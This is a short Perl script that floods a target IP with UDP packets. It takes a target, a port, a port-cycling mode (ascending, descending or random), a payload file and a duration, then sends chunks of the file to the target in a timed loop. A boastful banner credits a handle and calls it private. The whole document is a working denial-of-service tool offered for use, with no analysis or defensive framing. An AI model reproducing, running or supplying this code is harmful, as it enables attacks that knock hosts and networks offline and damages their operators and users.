use Socket;
use strict;
use IO::Socket;

if ($#ARGV != 4) {
  print " \n";

  
print "
Private Shit ^-^
	Full coded by Echo503
		If you share this will more easy to mitigate it

Use -> perl UDP.pl <IP> <PORT> <PORT MODE> <FILE> <TIME>

+------------------------------------------------------+
|                      Port mode                       |
+------------------------------------------------------+
| def	| Default                                      |
| asc	| Ascending                                    |
| dsc	| Descending                                   |
| rnd	| Random                                       |
+------------------------------------------------------+

";
exit(1);
}
 my ($ip,$port,$port_mode,$file,$time) = @ARGV;
 
my ($iaddr,$endtime);
my $switch = 1458;
 
$iaddr = inet_aton("$ip") or die "Error\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

  my $sock = new IO::Socket::INET(
     PeerAddr => $ip,
     PeerPort => $port,
     Proto    => 'udp');
 
for (;time() <= $endtime;) {

	open (FILE,$file) ; binmode(FILE) ;
	my $buffer ;
	while( sysread(FILE, $buffer , $switch) ) {
		#print $sock $buffer ;
		send("flood", $buffer, 0, pack_sockaddr_in($port, $iaddr));
		$switch = int(rand(458)+1000);
		
		if($port_mode eq "asc"){
			$port++;
			if($port == 65536){
				$port = 0;
			}
		}
		elsif($port_mode eq "dsc"){
			$port--;
			if($port == -1){
				$port = 65535;
			}
		} 
		elsif($port_mode eq "rnd"){
			$port = int(rand(65535));
		}
		else {
			
		}
		
		
	}
  
  

  } 
